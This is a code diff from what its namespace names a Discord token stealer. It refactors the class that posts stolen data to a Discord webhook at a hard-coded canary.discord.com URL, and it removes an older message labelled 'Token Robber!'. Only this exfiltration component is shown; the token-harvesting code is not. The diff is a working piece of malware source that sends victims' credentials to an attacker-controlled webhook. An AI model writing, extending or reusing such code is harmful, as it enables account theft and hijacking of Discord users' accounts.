@@ -3,32 +3,20 @@ using System.Net.Http.Json;
 
 namespace DiscordTokenStealer.Discord;
 
-public class DiscordWebhook : IDisposable
+public sealed class DiscordWebhook : IDisposable
 {
     private readonly HttpClient _client;
-
-    private DiscordWebhook(Uri webhookUri)
+    public DiscordWebhook(string id, string token)
     {
         _client = new HttpClient(new HttpClientHandler { UseProxy = true, Proxy = new WebProxy() }, true)
         {
-            BaseAddress = webhookUri
+            BaseAddress = new Uri($"https://canary.discord.com/api/webhooks/{id}/{token}")
         };
     }
 
-    public DiscordWebhook(string webhook) : this(new Uri(webhook))
+    public async Task SendMessage(DiscordMessage message)
     {
-
-    }
-
-    public async Task SendMessage(string message, CancellationToken token = default)
-    {
-        using HttpResponseMessage response = await _client.PostAsync(string.Empty, JsonContent.Create(new DiscordMessage(message, "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256")), token);
-        response.EnsureSuccessStatusCode();
-    }
-
-    public async Task SendMessage<T>(T message, CancellationToken token = default) where T : DiscordMessage
-    {
-        using HttpResponseMessage response = await _client.PostAsync(string.Empty, JsonContent.Create(message), token);
+        using HttpResponseMessage response = await _client.PostAsync(string.Empty, JsonContent.Create(message));
         response.EnsureSuccessStatusCode();
     }
 
@@ -36,10 +24,5 @@ public class DiscordWebhook : IDisposable
     {
         _client.Dispose();
         GC.SuppressFinalize(this);
-    }
-
-    ~DiscordWebhook()
-    {
-        Dispose();
     }
 }
